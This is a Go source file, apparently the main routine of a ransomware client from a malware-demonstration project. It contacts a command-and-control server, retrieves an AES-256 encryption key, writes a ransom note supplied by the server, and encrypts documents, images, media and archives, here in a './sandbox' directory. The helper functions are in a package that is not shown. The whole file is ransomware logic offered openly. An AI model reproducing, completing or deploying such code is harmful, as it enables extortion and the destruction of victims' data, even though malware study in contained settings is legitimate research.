package main

import (
	"fmt"
	"log"
	"ransomware_client/utilities"

	"github.com/joho/godotenv"
)

func main() {
	// Load .env file
	err := godotenv.Load()
	if err != nil {
		log.Panicf("Error loading .env file: %v", err.Error())
	}

	fmt.Println("Connected to the C&C Server")

	// (Phase 0) Generate a random signature
	signature := utilities.CreateRandomSignature()
	fmt.Printf("Generated signature: %s\n", signature)

	// (Phase 1) Establishing connection to the server
	utilities.ExecuteRansomwarePhase("KNIGHTCHASER_MALWARE_DEPOT_RANSOMWARE_CLIENT:ESTABLISHCONNECTION", signature)

	// (Phase 2) Get the encryption key from the server
	encryptionKeyAES256 := make([]byte, 32)
	copy(encryptionKeyAES256, utilities.ExecuteRansomwarePhase("KNIGHTCHASER_MALWARE_DEPOT_RANSOMWARE_CLIENT:GETENCRYPTIONKEY", signature))
	if len(encryptionKeyAES256) != 32 {
		log.Panicf("Error: Invalid encryption key received from the server, length: %d", len(encryptionKeyAES256))
	} else {
		fmt.Printf("Encryption key received from the server: 0x%x...\n", encryptionKeyAES256[:16])
	}

	// (Phase 3) Receive a ransom note from the server and save it to a file
	ransomnoteContent := utilities.ExecuteRansomwarePhase("KNIGHTCHASER_MALWARE_DEPOT_RANSOMWARE_CLIENT:CREATERANSOMNOTE", signature)
	utilities.CreateRansomnote(ransomnoteContent)

	// (Phase 4) Initialize the file encryption process
	utilities.ExecuteRansomwarePhase("KNIGHTCHASER_MALWARE_DEPOT_RANSOMWARE_CLIENT:INITIALIZEFILEENCRYPTION", signature)
	fileExtensionsToEncrypt := []string{".txt", ".docx", ".xlsx", ".pptx", ".jpg", ".png", ".mp4", ".mp3", ".pdf", ".zip"}
	fileEncryptionDirectories := []string{"./sandbox"}
	utilities.InitializeEncryption(fileExtensionsToEncrypt, fileEncryptionDirectories, encryptionKeyAES256)
}
